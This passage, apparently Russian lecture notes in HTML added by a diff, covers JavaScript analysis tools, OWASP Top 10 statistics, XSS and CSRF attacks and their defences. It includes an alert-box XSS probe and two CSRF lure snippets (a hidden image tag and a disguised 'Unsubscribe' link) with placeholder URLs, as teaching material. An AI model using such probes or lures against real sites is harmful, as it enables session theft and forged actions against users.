+				примеров.</p>
+			<ul id="3675c0c1-b7d8-4c46-98f8-08228c408af8" class="bulleted-list">
+				<li style="list-style-type:disc"><strong>WARI</strong> — статический анализатор, который исследует
+					зависимости между функциями JS, стилями CSS, тегами HTML и изображениями. Смысл этой утилиты —
+					находить при статическом анализе неиспользуемые ресурсы. Однако с динамикой WARI, конечно, не
+					справится.</li>
+			</ul>
+			<ul id="3c99107b-00e6-4f4b-8d0b-ec367fd1c612" class="bulleted-list">
+				<li style="list-style-type:disc"><strong>JSLint</strong> — утилита для анализа статического кода,
+					которая сама написана на JavaScript. Она проверяет код на соответствие хорошим практикам.</li>
+			</ul>
+			<ul id="a61b0281-4e4e-405b-bbf2-7c889295fea4" class="bulleted-list">
+				<li style="list-style-type:disc"><strong>Google Closure Compiler</strong> — JS-оптимизатор, который
+					автоматически переписывает код с целью сделать его быстрее и компактнее. Заодно в трубу вылетают все
+					комментарии и любые неиспользуемые участки кода.</li>
+			</ul>
+			<ul id="6126b44b-f323-43b2-a2e0-ad55e49a48a9" class="bulleted-list">
+				<li style="list-style-type:disc"><strong>WebScent</strong> — продвинутый статический анализатор. В
+					работе он исходит из того, что клиентский JS-код (тот, который загружается в браузер) не хранится на
+					стороне сервера в целом виде, а рассеян по серверному коду кусками. «Душок» в этих кусках не может
+					быть легко обнаружен до тех пор, пока из них не будет сгенерирован цельный клиентский код. WebScent
+					анализирует клиентский код с тем, чтобы найти проблемные места в серверном коде. При этом работа
+					статического анализатора WebScent в основном сводится к распутыванию замесов HTML, CSS и JS — с
+					целью обнаружить дублирующийся код и ошибки в синтаксисе HTML.</li>
+			</ul>
+			<h2 id="4411e641-b4b7-4137-a058-3ed01f9b97e0" class=""><strong>Утилиты для динамического анализа</strong>
+			</h2>
+			<ul id="63909843-8c6e-443f-9048-5ca590b22af3" class="bulleted-list">
+				<li style="list-style-type:disc"><strong>JSNose </strong>— утилита, в которой объединены статический и
+					динамический анализ. Она анализирует код на наличие тринадцати антипаттернов. Семь из них (в том
+					числе lazy object и long function) — общие для всех языков программирования, а шесть остальных
+					(closure smells, excessive global variables, nested callbacks и другие) специфичны для JavaScript.
+				</li>
+			</ul>
+			<ul id="3198377f-db9e-40ff-b213-004e1df7c321" class="bulleted-list">
+				<li style="list-style-type:disc"><strong>DOMPletion </strong>— автоматизированная утилита, которая
+					помогает веб-разработчику понимать код при просмотре: объясняет причину присутствия структур DOM,
+					выполняет динамический анализ, а также предоставляет умный автокомплит для кода, который
+					взаимодействует с DOM.</li>
+			</ul>
+			<ul id="5d5dc9b1-8be7-4d0d-9307-dab7fade8a14" class="bulleted-list">
+				<li style="list-style-type:disc"><strong>Clematis </strong>— фреймворк, который помогает распутывать
+					сложные событийные взаимодействия. Clematis детально фиксирует все события, которые срабатывают при
+					выполнении, и визуализирует их в виде абстрактной поведенческой модели, в которой отражаются
+					временные и причинно-следственные связи между компонентами и событиями.</li>
+			</ul>
+			<h1 id="b3993c19-00ca-4e7c-96dc-0be90731d4e4" class="">OWASP TOP-10</h1>
+			<p id="2affa6e4-025b-4a7c-8911-a061ffb4de86" class=""><strong>Open Web Application Security Project</strong>
+				(<strong>OWASP</strong>) – открытый проект по обеспечению безопасности приложений, все материалы
+				которого доступны бесплатно на <a href="https://owasp.org/">веб-сайте</a> некоммерческой
+				организации <strong>OWASP Foundation</strong>. Поставляемые материалы включают документацию,
+				мероприятия, форумы, проекты, инструменты и видео, такие как <strong>OWASP Top 10</strong>,
+				веб-протоколы <strong>OWASP CLASP </strong>и <strong>OWASP ZAP</strong>, а также сканер веб-приложений с
+				открытым исходным кодом.</p>
+			<p id="3f731af9-c621-4895-903d-45692ea6ec83" class="">OWASP важен для организаций, потому что его
+				рекомендации высоко ценятся проверяющими безопасность корпоративных систем аудиторами. Рекомендации
+				проекта по защите приложений необходимо включить в жизненный цикл разработки программного обеспечения и
+				использовать для формирования политик безопасности.</p>
+			<h3 id="9113d474-2ea5-4b46-a2f7-0fcc70242520" class=""><strong>Что такое топ-10 уязвимостей OWASP и как он
+					работает?</strong></h3>
+			<p id="a162b138-7c31-4e02-8df9-c04a33402883" class=""><strong>OWASP Top 10</strong> – это отчет или
+				информационный документ, в котором перечислены основные проблемы, связанные с безопасностью
+				веб-приложений. Он регулярно обновляется, чтобы постоянно отображать 10 наиболее серьезных рисков, с
+				которыми сталкиваются организации. OWASP рекомендует всем компаниям учитывать выводы документа при
+				построении корпоративных процессов, чтобы минимизировать и смягчить актуальные риски безопасности.</p>
+			<p id="a5ff5eae-085b-425b-ade8-cb3ab1c66c5d" class="">Отчет об уязвимостях OWASP формируется на основе
+				консенсуса мнений экспертов по безопасности со всего мира. Он ранжирует риски на основе частоты
+				дефектов, серьезности уязвимостей и их потенциального воздействия. Это дает разработчикам и специалистам
+				по безопасности понимание наиболее серьезных рисков и позволяет им минимизировать возможные последствия
+				эксплуатации уязвимостей злоумышленниками.</p>
+			<h3 id="0930d260-4ea3-4d2c-b24c-0ef49a74f15c" class=""><strong>Самые распространенные уязвимости</strong>
+			</h3>
+			<p id="86a20e27-dc5e-4f36-8b50-c530bc5bf1d8" class="">Ниже представлено распределение уязвимостей по
+				категориям OWASP Top 10 — 2021 (доля приложений):</p>
+			<figure id="94286243-369f-47a0-9de2-340ddd87060f" class="image"><a
+					href="%D0%9C%D0%B0%D1%82%D0%B5%D1%80%D0%B8%D0%B0%D0%BB%20%D0%BB%D0%B5%D0%BA%D1%86%D0%B8%D0%B8%206730a7e902a54e9c9fa5e01c23947b51/Untitled%203.png"><img
+						style="width:768px"
+						src="%D0%9C%D0%B0%D1%82%D0%B5%D1%80%D0%B8%D0%B0%D0%BB%20%D0%BB%D0%B5%D0%BA%D1%86%D0%B8%D0%B8%206730a7e902a54e9c9fa5e01c23947b51/Untitled%203.png" /></a>
+			</figure>
+			<p id="8d24d952-5a2e-4f29-989b-53a3151cb672" class="">Уязвимости, связанные с нарушениями контроля доступа,
+				стали наиболее актуальными за прошедшие два года — их прирост составил 63 п. п. по сравнению с 2019
+				годом. Более подробно об этих уязвимостях вы можете прочитать <a
+					href="https://www.ptsecurity.com/ru-ru/research/analytics/web-vulnerabilities-2020-2021/#id12">здесь</a>.
+			</p>
+			<p id="4b9411b6-2c4d-4645-90ec-834a5d1409df" class="">Результаты анализа защищенности веб-приложений
+				показали, что 83% из них имеют уязвимости, связанные с неправильной конфигурацией механизмов защиты
+				(security misconfiguration). В 48% исследованных приложений было обнаружено отсутствие заголовка
+				Strict-Transport-Security (CWE-523), который обязывает браузер пользователя использовать протокол HTTPS
+				для безопасной передачи данных. Наличие настроенного заголовка обеспечивает защищенную передачу данных,
+				в том числе конфиденциальных, что, в свою очередь, позволяет избежать атак типа man in the middle. В 34%
+				приложений неправильно сконфигурирован заголовок X-Content-Type-Options (CWE-16), что делает их
+				уязвимыми для атак с подменой контента, например для межсайтового выполнения сценариев.</p>
+			<h3 id="07f60f69-9e05-470d-90da-355720192d94" class=""><strong>Распространенные уязвимости, не вошедшие в
+					OWASP Top 10</strong></h3>
+			<figure id="bfd68f9b-f2c6-4f76-952b-a482a00c96e7" class="image"><a
+					href="%D0%9C%D0%B0%D1%82%D0%B5%D1%80%D0%B8%D0%B0%D0%BB%20%D0%BB%D0%B5%D0%BA%D1%86%D0%B8%D0%B8%206730a7e902a54e9c9fa5e01c23947b51/Untitled%204.png"><img
+						style="width:768px"
+						src="%D0%9C%D0%B0%D1%82%D0%B5%D1%80%D0%B8%D0%B0%D0%BB%20%D0%BB%D0%B5%D0%BA%D1%86%D0%B8%D0%B8%206730a7e902a54e9c9fa5e01c23947b51/Untitled%204.png" /></a>
+			</figure>
+			<p id="36aaf2bd-16a1-4b5b-8482-022e0bc52725" class="">Среди уязвимостей, не входящих в <a
+					href="https://owasp.org/Top10/">OWASP Top 10 — 2021</a>, наибольшее распространение получила
+				уязвимость неконтролируемого использования вычислительных ресурсов (CWE-400), позволяющая
+				злоумышленникам проводить DoS-атаки на приложение. В процессе анализа одного из приложений специалистам
+				удалось эксплуатировать такую уязвимость, отправляя запросы на формирование большого количества объемных
+				отчетов в формате PDF. Это, в свою очередь, вызвало увеличение количества потребляемых ресурсов и
+				задержки в доступе к приложению.</p>
+			<p id="dcf78078-5e69-41b4-b919-216923ae61a7" class="">Вторую позицию занимает уязвимость некорректной
+				проверки наличия нестандартных условий (CWE-754), когда веб-приложение принимает параметры, значения
+				которых не являются для него стандартными. В одном из исследованных приложений эта уязвимость привела к
+				продлению пробного периода пользования. Для этого был сформирован запрос к сценарию активации пробного
+				периода с измененным тарифом — подобные действия позволили продлить бесплатный период еще на один месяц.
+				Эта же уязвимость могла быть использована для массовой рассылки электронных писем с вредоносным
+				вложением от имени службы поддержки приложения: в шаблоне HTTP-запроса значение поля полезной нагрузки
+				было заменено на файл с расширением .pdf и были указаны адреса электронной почты.</p>
+			<p id="8abb0131-f5a6-4da8-96ec-58b021732b0f" class="">Уязвимость раскрытия конфиденциальной информации в
+				отладочном коде приложения (CWE-215) вошла в тройку наиболее часто встречающихся уязвимостей не из
+				списка OWASP Top 10. Раскрытие информации в отладочном коде может предоставить злоумышленнику больше
+				сведений о системе, которые могут быть использованы для подбора методов и инструментария планируемых
+				атак.</p>
+			<p id="f703e91f-2d2e-4e9c-9ef6-236f0e6c0df2" class="">
+			</p>
+			<h1 id="6d78bc64-4c11-4944-9387-d804a4b05c77" class=""></h1>
+			<p id="37bafd0a-3068-4f6f-ac08-04807111f618" class="">
+			</p>
+			<h1 id="b5c68e6c-92b0-4129-b254-e2ca219dacab" class="">Client-Side: XXS, CSRF</h1>
+			<h2 id="63050f5d-1955-4895-917a-d263533cdc3a" class="">XSS</h2>
+			<p id="e83ca71e-f148-44a2-beae-33ac581d549f" class=""><strong>XSS (</strong><em><strong>Cross-Site Scripting
+						- </strong></em><strong>Межсайтовый скриптинг)</strong> это термин, используемый для описания
+				типа атак, которые позволяют злоумышленнику внедрять вредоносный код <em>через </em>веб-сайт в браузеры
+				других пользователей. Поскольку внедрённый код поступает в браузер с сайта, он является <em>доверенным
+				</em>и может выполнять такие действия, как отправка авторизационного файла <em>cookie </em>пользователя
+				злоумышленнику. Когда у злоумышленника есть файл <em>cookie</em>, он может войти на сайт, как если бы он
+				был пользователем, и сделать все, что может пользователь, например, получить доступ к данным кредитной
+				карты, просмотреть контактные данные или изменить пароли.</p>
+			<p id="a12102cc-4f76-467a-a248-b8d65118cde6" class="">По вектору атаки уязвимости XSS делятся
+				на <strong>отражённые (непостоянные),</strong> <strong>хранимые (постоянные)</strong> и <strong>XSS в
+					DOM-модели (Client side XSS).</strong></p>
+			<h3 id="0d0bb82c-e56a-45bf-8b59-fae9f338e789" class="">О<strong>тражённый XSS</strong></h3>
+			<p id="d5283c04-3411-434c-adf7-38f5a79d6d68" class="">Это наиболее распространенный сегодня тип XSS-атак. Их
+				смысл в том, что злоумышленник прячет вредоносный код в заранее подготовленной ссылке, которую потом
+				передает пользователям-жертвам в почтовой рассылке или размещает на веб-странице. Когда пользователь
+				переходит по зараженной ссылке, серверные скрипты исполняют ее код без обработки и возвращают его в виде
+				ответа. Браузер пользователя исполняет зараженный скрипт, а злоумышленник получает cookies жертвы.</p>
+			<h3 id="86c791bb-8560-48a4-9e19-2d79de29ef73" class="">Хранимый <strong>XSS</strong></h3>
+			<p id="8a1460c2-af2a-4560-90c4-bb6bbf6dd87a" class="">Такие уязвимости возникают, когда злоумышленнику
+				удается получить доступ к серверу и сохранить на нем вредоносный код. Такой сохраненный скрипт будет
+				активироваться каждый раз, когда пользователь заходит на зараженную страницу. Часто хранимые
+				XSS-уязвимости можно найти на различных форумах, а также в соцсетях, имиджбордах, блогах и других
+				представителях Веб 2.0. Для их внедрения на ресурс злоумышленники могут использовать обычный текст
+				(например, в виде комментариев), рисунки, гифки и другой размещаемый контент.</p>
+			<h3 id="7ac15d85-5a4e-4f9e-8edc-8e8d77892755" class=""><strong>XSS в DOM-модели (Client side XSS)</strong>
+			</h3>
+			<p id="77e8c51d-d6e6-4576-97ae-9782c5bb1633" class="">Суть этой уязвимости — в использовании злоумышленником
+				Document Object Model, объектной модели документа. Это программный интерфейс, дающий программам и
+				сценариям доступ к контенту HTML-, XHTML- и XML-документов и возможность этим содержанием (а также
+				структурой и оформлением) управлять. XSS-уязвимости на основе DOM-модели могут быть как отраженными, так
+				и хранимыми. Их главная особенность — сама страница сайта или веб-приложения не меняется, но меняется ее
+				отображение в браузере пользователя из-за вредоносных модификаций DOM.</p>
+			<h3 id="5c361934-5f07-4d0e-bed9-1ebbdfd807f4" class="">XSS по степени активности</h3>
+			<p id="14e3a8f2-19c0-4e45-b916-c373e4e70a61" class="">Также XSS-уязвимости различаются по степени
+				активности:</p>
+			<ul id="bbf51564-fb2b-4de3-81bd-de69c98d521f" class="bulleted-list">
+				<li style="list-style-type:disc"><strong>Активные.</strong> Такие уязвимости действуют сами независимо
+					от активности пользователя. То есть, как только пользователь-жертва попадает на зараженную страницу,
+					вредоносный скрипт запускается автоматически. Например, такие уязвимости встраиваются в базы данных
+					или исполняемые файлы на сервере, в формы ввода (с помощью автоматических обработчиков событий) и
+					т.д.</li>
+			</ul>
+			<ul id="601b66e8-c15d-4e1e-9d92-c313464b699f" class="bulleted-list">
+				<li style="list-style-type:disc"><strong>Пассивные.</strong> В этом случае для активации вредоносного
+					кода пользователь-жертва должен совершить какое-то действие: ввести запрос, кликнуть ссылку. Чтобы
+					это произошло, злоумышленник должен как-то его заставить, спровоцировать или замотивировать. Здесь в
+					ход идут методы социальной инженерии — например, фишинг.</li>
+			</ul>
+			<h3 id="270a3837-3d0e-483d-9a49-9c6ebacfa723" class="">Последствия XSS-атаки</h3>
+			<p id="27504c42-cb5a-4f28-8fd3-881435c95196" class="">Сами XSS-уязвимости опасности для самого ресурса или
+				его пользователей не представляют. Угрозу несут именно атаки, для которых эти бреши в обороне являются
+				«точками входа». С помощью XSS-атаки можно нанести ресурсу и его пользователям разнообразный вред.</p>
+			<p id="af3b0600-be82-4d50-a99c-3bd39f3fb5fa" class=""><strong>Кража пользовательских данных.</strong> Сайты
+				и приложения, на которых предусмотрена авторизация пользователей, отличают авторизованного посетителя от
+				неавторизованного с помощью специального cookie-файла (сессионной cookie). Этот файл будет видеть только
+				авторизованный посетитель, а еще — любой JavaScript-код, исполняемый его браузером (в том числе и
+				помещенный на страницу злоумышленником). Прочитав сессионную cookie жертвы, вредоносный скрипт через
+				AJAX-запрос передает данные авторизации на удаленный сервер, предварительно созданный злоумышленником.
+				Там эта информация заносится в базу данных, и хакеру остается только вычленить ее из параметров URL. Это
+				дает злоумышленнику следующие возможности:</p>
+			<ul id="dba0bc76-7f7c-408a-9a07-085a8ffda94b" class="bulleted-list">
+				<li style="list-style-type:disc">похитить конфиденциальные данные пользователя: историю посещений,
+					информацию по платежным картам, личную переписку и т.д.;</li>
+			</ul>
+			<ul id="56305078-d068-4adc-aced-48347fab9f19" class="bulleted-list">
+				<li style="list-style-type:disc">использовать аккаунт пользователя-жертвы для рассылки спама, угроз и
+					другого противоправного контента, публикации комментариев с противозаконным или компрометирующим
+					содержанием;</li>
+			</ul>
+			<ul id="1152697e-cd1e-4eb1-b885-5f07e83a8d1f" class="bulleted-list">
+				<li style="list-style-type:disc">рассылать вредоносные программы другим пользователям, особенно тем, у
+					кого пользователь-жертва пользовался доверием;</li>
+			</ul>
+			<ul id="038046e4-a63a-4da4-a606-f2cc97a99aae" class="bulleted-list">
+				<li style="list-style-type:disc">получить бесплатный доступ к платному контенту: учебным курсам,
+					мультимедийному контенту и т.д.</li>
+			</ul>
+			<p id="5e1477e1-c98b-4469-ab8e-bd8ba509f8ad" class=""><strong>Доступ к управлению
+					сайтом.</strong> Злоумышленник может завладеть не только данными авторизованных пользователей, но и
+				правами администратора сайта/веб-приложения. В этом случае он получает доступ к панели управления
+				ресурсом и может контролировать его содержание, структуру, оформление. Такие возможности позволяют
+				злоумышленнику:</p>
+			<ul id="877f02c4-76c6-41a4-bb0d-b2afd20263ab" class="bulleted-list">
+				<li style="list-style-type:disc">получить авторизационные данные любого зарегистрированного на сайте
+					пользователя;</li>
+			</ul>
+			<ul id="b6814cba-7a88-408f-a214-03efe2c1c6dc" class="bulleted-list">
+				<li style="list-style-type:disc">испортить функционал и/или оформление сайта с целью его дискредитации в
+					глазах настоящих или потенциальных посетителей;</li>
+			</ul>
+			<ul id="2cc9e9d6-87c0-4109-8e93-3494bc90332a" class="bulleted-list">
+				<li style="list-style-type:disc">разместить на ресурсе посторонний, противозаконный или компрометирующий
+					контент, внести изменения в уже имеющееся содержание (пресс-релизы, статьи, описания товаров и
+					т.д.);</li>
+			</ul>
+			<ul id="abba53b1-5e0c-4adf-ba9f-2f8e05148c8a" class="bulleted-list">
+				<li style="list-style-type:disc">взломать корпоративную базу данных для получения конфиденциальной
+					информации (секретных технологий, сведений о коммерческой деятельности и т.д.).</li>
+			</ul>
+			<p id="8255114b-8347-4f4e-9d92-6d4809befe99" class="">Опасность не ограничивается лишь потерей или кражей
+				данных, репутационными издержками — последствия могут быть куда серьезнее. Например, если злоумышленник
+				получает на сайте фармацевтической компании доступ к описанию лекарства, он может изменить информацию по
+				дозировке сильнодействующего лекарства. Как результат — массовые интоксикации с тяжелыми последствиями
+				вплоть до летальных исходов.</p>
+			<h3 id="f81e92c1-9098-46b9-8380-cb19156fc3e8" class="">Защита от XSS-атак</h3>
+			<p id="1119615e-5786-40f8-bb5e-75b32d050ee2" class="">Чтобы защититься от межсайтового скриптинга,
+				необходимо сначала выявить на сайте или в веб-приложении возможные уязвимости для атак этого типа.
+				Сделать это можно двумя способами.</p>
+			<p id="3ca1d3b0-3fb7-420e-8f51-d1af7b4e347d" class=""><strong>Автоматически.</strong> Для поиска уязвимостей
+				существуют специальные сервисы, с помощью которых анализируются все страницы, на которых присутствуют
+				интерактивные элементы: формы обратной связи и оформления заказов, поисковая строка, поля для публикации
+				комментариев и т.д. Стоит учитывать, что возможности любого такого сервиса ограничены, поэтому для
+				максимально объективной оценки уязвимостей лучше проверять сайт на нескольких ресурсах. Тем не менее
+				автоматизированные сервисы серьезно упрощают работу, особенно если анализируемый сайт имеет сложную
+				структуру или большое количество внутренних страниц.</p>
+			<p id="ec336b1f-a0cc-490f-b49e-c3b75b1f05e1" class=""><strong>Вручную.</strong> Такой способ требует больших
+				затрат времени и сил, зато более надежен (если проводится грамотным специалистом). Здесь алгоритм такой
+				же: проверяется каждая страница сайта с интерактивными элементами, которые используются посетителями для
+				ввода данных. Например, с помощью скрипта &lt;script&gt;alert(123)&lt;/script&gt;. Если его ввести в
+				интерактивное поле для размещения запроса или текста, то при отсутствии защиты появится такое
+				уведомление:</p>
+			<figure id="7bd2a7f4-853f-474b-85a3-57ebda5b9137" class="image"><a
+					href="%D0%9C%D0%B0%D1%82%D0%B5%D1%80%D0%B8%D0%B0%D0%BB%20%D0%BB%D0%B5%D0%BA%D1%86%D0%B8%D0%B8%206730a7e902a54e9c9fa5e01c23947b51/Untitled%205.png"><img
+						style="width:480px"
+						src="%D0%9C%D0%B0%D1%82%D0%B5%D1%80%D0%B8%D0%B0%D0%BB%20%D0%BB%D0%B5%D0%BA%D1%86%D0%B8%D0%B8%206730a7e902a54e9c9fa5e01c23947b51/Untitled%205.png" /></a>
+			</figure>
+			<p id="5afb36ea-186a-4cbd-8c6c-2e0273d49816" class="">Ручная проверка по понятным причинам не очень
+				эффективна на крупных сайтах, зато вполне применима на небольших ресурсах или одностраничниках.</p>
+			<p id="ce59ce28-5589-4cd3-aef1-1ad865dfc8f9" class="">Когда уязвимости найдены, можно приступать
+				непосредственно к защите от угроз. Для этого рекомендуется:</p>
+			<ul id="a8d0142d-2df6-4dec-b96d-b363f0acdb3c" class="bulleted-list">
+				<li style="list-style-type:disc">настроить фильтрацию и экранизацию входных параметров, то есть
+					информации, вводимой пользователем через интерактивные поля и формы;</li>
+			</ul>
+			<ul id="f402de1c-f350-4dc7-83ab-66028e48bc43" class="bulleted-list">
+				<li style="list-style-type:disc">настроить автоматическую замену спецсимволов, чтобы четко отделить
+					пользовательский текст от исполняемого кода;</li>
+			</ul>
+			<ul id="755b90d7-0d77-4ff8-abe4-a8863ca35c80" class="bulleted-list">
+				<li style="list-style-type:disc">на каждой странице сайта разместить кодировку перед какими-либо
+					пользовательскими полями;</li>
+			</ul>
+			<ul id="564c7b9f-4d6e-4d92-9c00-04320c456bd3" class="bulleted-list">
+				<li style="list-style-type:disc">установить ограничения домена и путей приема cookie-файлов с помощью
+					SSL или параметра HttpOnly;</li>
+			</ul>
+			<ul id="34330c22-5a5c-401c-9348-87a15428bf1a" class="bulleted-list">
+				<li style="list-style-type:disc">регулярно проверять сайт или веб-приложение на уязвимости такими
+					инструментами, как Nessus, Nikto Web Scanner и т.д.;</li>
+			</ul>
+			<ul id="4f54176a-f797-435f-b81a-f9ca1fe66de4" class="bulleted-list">
+				<li style="list-style-type:disc">задать список желательных источников для загрузки контента с помощью
+					заголовка Content Security Policy;</li>
+			</ul>
+			<ul id="be9a7004-8782-48c8-a895-ba1dd928b4b8" class="bulleted-list">
+				<li style="list-style-type:disc">регулярно обновлять браузер до актуальной версии и использовать
+					расширения для проверки URL, скриптов, интерактивных форм и других потенциальных источников угроз.
+				</li>
+			</ul>
+			<p id="34cce6b5-afee-43b7-9e25-f73649e1df50" class="">Практика показывает, что на 100% от XSS-атак не
+				защищен ни один ресурс или браузер. В ответ на появление новых средств защиты злоумышленники
+				разрабатывают новые пути их обхода. Однако использование актуальных способов цифровой гигиены и обычная
+				бдительность позволяют снизить риск межсайтового скриптинга до приемлемого минимума.</p>
+			<h2 id="6b9e9932-ad64-4c43-8afe-9dcc6339aeef" class="">CSRF</h2>
+			<p id="8b7309ff-4118-450b-99f9-6b6102983dcf" class="">CSRF (cross-site request forgery, подделка межсайтовых
+				запросов) — вид атак на сайт, при которой злоумышленник с помощью мошеннического сайта или скрипта
+				заставляет браузер пользователя выполнять на доверенном сайте действия от его имени: отправлять
+				сообщения, менять пароли, переводить деньги со счета на счет и пр. В атаке используются
+				недостатки протокола HTTP.</p>
+			<p id="9f029a69-d4a0-4e7a-a9bc-151cd8749d25" class="">Чтобы стать жертвой,<strong> </strong>пользователю
+				достаточно перейти по ссылке от мошенника, которая может быть изменена с помощью сокращателя. Например,
+				человек, авторизованный на сайте банка, может кликнуть по фишинговой ссылке с запросом на перевод денег
+				на счет мошенника. Из-за авторизации обработается запрос на перевод.</p>
+			<p id="f585f4eb-b751-4cb4-9f49-09d78465a267" class="">CSRF-атака не подходит для кражи конфиденциальных
+				данных, так как итоговый запрос, выполняющий основное действие, не отправляет их мошеннику.</p>
+			<p id="e2a21c51-7c18-456f-b89b-ad21c49dcbab" class="">
+			</p>
+			<h3 id="9636428b-d198-45ad-8e58-1cd571fba5b4" class="">Принцип работы CSRF</h3>
+			<p id="b7454089-3518-48f1-ab9a-db07bc34127d" class="">Разобраться, как работает межсайтовая подделка
+				запросов, поможет понятие сессионных cookies (куки).</p>
+			<p id="9e01438b-bbdf-440f-85ff-65071f09fcec" class="">Сессионные cookies — это небольшой набор данных,
+				которые веб-сервер отправляет браузеру при посещении сайта. Они хранятся на компьютерах пользователей и
+				используются для их идентификации. Именно благодаря cookies не нужно авторизовываться на сайте дважды, а
+				в корзине интернет-магазина содержится все, что было добавлено, даже если страницу перезагрузили.</p>
+			<p id="a9226d66-a22d-491a-9e40-99c615c9a915" class="">После сохранения браузер отправляет cookies на сервер
+				с каждым запросом и идентифицирует пользователя. С их помощью злоумышленник может выдать себя за
+				потенциальную жертву и заставить ее браузер выполнить запрос. Если пользователь уже авторизован на
+				сайте, cookies отправятся автоматически вместе с запросом.</p>
+			<figure id="dc20a48e-5c28-4e64-9268-9eaa1b46ba8a" class="image"><a
+					href="%D0%9C%D0%B0%D1%82%D0%B5%D1%80%D0%B8%D0%B0%D0%BB%20%D0%BB%D0%B5%D0%BA%D1%86%D0%B8%D0%B8%206730a7e902a54e9c9fa5e01c23947b51/Untitled%206.png"><img
+						style="width:1581px"
+						src="%D0%9C%D0%B0%D1%82%D0%B5%D1%80%D0%B8%D0%B0%D0%BB%20%D0%BB%D0%B5%D0%BA%D1%86%D0%B8%D0%B8%206730a7e902a54e9c9fa5e01c23947b51/Untitled%206.png" /></a>
+			</figure>
+			<p id="1ac84f24-55d1-4b53-b60a-344251597e0b" class=""><strong>Для выполнения CSRF необходимы несколько
+					условий:</strong></p>
+			<ul id="5fa1e028-8f9c-4794-befb-732eb70624b0" class="bulleted-list">
+				<li style="list-style-type:disc">на уязвимом сайте есть действие, которое хакер хочет выполнить от имени
+					жертвы, например изменить адрес @mail, осуществить перевод денежных средств, изменить пароль и так
+					далее;</li>
+			</ul>
+			<ul id="7f906316-0957-4ba1-8026-48d32358cb69" class="bulleted-list">
+				<li style="list-style-type:disc">злоумышленник заранее знает все параметры запроса, которые ожидает
+					увидеть уязвимый сайт. Даже незначительное отличие в тексте повлияет на работоспособность;</li>
+			</ul>
+			<ul id="63a1a399-2405-4c75-87c2-cfa3d3462b6a" class="bulleted-list">
+				<li style="list-style-type:disc">действие полагается только на файлы cookies для верификации
+					пользователя и выполняется с помощью HTTP-запросов.</li>
+			</ul>
+			<p id="7e532481-b125-4710-8e2b-ea3f208a5e61" class="">CSRF-атаке могут быть подвержены все сайты и
+				веб-приложения, которые добавляют данные для аутентификации пользователя к HTTP-запросу автоматически.
+			</p>
+			<p id="8223fe2d-3967-4801-90dc-18f7c8cf478d" class="">Либо злоумышленник может обманом заставить жертву
+				загрузить или отправить информацию. Например, через фишинговую ссылку.</p>
+			<p id="17863d64-f76e-44cf-9e9c-d684a609bbdd" class="">Она может быть скрыта в теге изображения:</p>
+			<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"
+				integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg=="
+				crossorigin="anonymous" referrerPolicy="no-referrer"></script>
+			<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css"
+				integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ=="
+				crossorigin="anonymous" referrerPolicy="no-referrer" />
+			<pre id="db4221a5-6140-40fa-803a-8b77e8459c00"
+				class="code"><code class="language-HTML">&lt;img src=“фишинговая ссылка” width=“0” height=“0” border=“0”&gt;</code></pre>
+			<p id="856aaf37-c3da-46ac-9e4f-2a284ebb9954" class="">Или замаскирована под обычную ссылку:</p>
+			<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"
+				integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg=="
+				crossorigin="anonymous" referrerPolicy="no-referrer"></script>
+			<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css"
+				integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ=="
+				crossorigin="anonymous" referrerPolicy="no-referrer" />
+			<pre id="8d0d2c3e-406d-4a82-9fe3-010985fa7298"
+				class="code"><code class="language-HTML">&lt;a href=“фишинговая ссылка”&gt;Unsubscribe here&lt;/a&gt;</code></pre>
+			<h3 id="2be905e9-b280-4d21-a8d5-149dffd23f9b" class="">Защита от CSRF-атак</h3>
+			<p id="453432b8-1bee-48b5-afba-4c4345d17299" class="">Некоторые фреймворки имеют встроенную защиту от
+				CSRF-атак. Например .NET или Laravel. Если ее нет, можно использовать следующие способы.</p>
+			<p id="e1d0ebbc-6056-4dd2-93e7-81d29d7305cc" class=""><strong>SOP</strong></p>
+			<p id="93cb7ea5-64c5-46df-80c0-228059f81c5f" class="">SOP (same-origin policy, политика одинакового
+				источника) определяет то, как именно скрипт или документ, который загружен из оригинального источника
+				(origin), будет взаимодействовать с ресурсом, загруженным из другого источника. Две страницы имеют
+				одинаковый источник, если у них совпадают хост (host), порт (port) и протокол (http или https). Часто
+				можно встретить также запись вида scheme/host/port tuple. Это позволяет изолировать документы, которые
+				могут нанести вред, и снизить количество вероятных векторов атак.</p>
+			<p id="4556e58c-5bb1-4cd9-b86b-4ea53b059bcf" class=""><strong>Токены CSRF</strong></p>
+			<p id="3fd45cd6-cc8d-404f-b766-8136c656dfeb" class="">CSRF-токены (или anti-CSRF-токены) напоминают cookies.
+				Это такие же данные, которые сервер отправляет браузеру в ожидании получить их обратно, но отличие в
+				следующем: сервер должен отправить браузеру уникальный токен и проверить, присылает ли его браузер в
+				ответ в запросе. Если токены совпадают, запрос действителен, если нет — отклоняется.</p>
+			<p id="e548936a-33a2-43e6-866c-103e36e6148a" class="">Токен должен удовлетворять требованиям:</p>
+			<ul id="39060bd7-1b91-4023-b4c4-d223e524c58a" class="bulleted-list">
+				<li style="list-style-type:disc">иметь конечное время жизни;</li>
+			</ul>
+			<ul id="f62a0c21-266f-4d91-80b3-dd11307d3b31" class="bulleted-list">
+				<li style="list-style-type:disc">генерироваться с использованием криптографии генератором
+					псевдослучайных чисел;</li>
+			</ul>
+			<ul id="0d6c37fd-0e17-4c4e-98bb-63b84fa22101" class="bulleted-list">
+				<li style="list-style-type:disc">иметь такую длину, чтобы быть устойчивым к перебору;</li>
+			</ul>
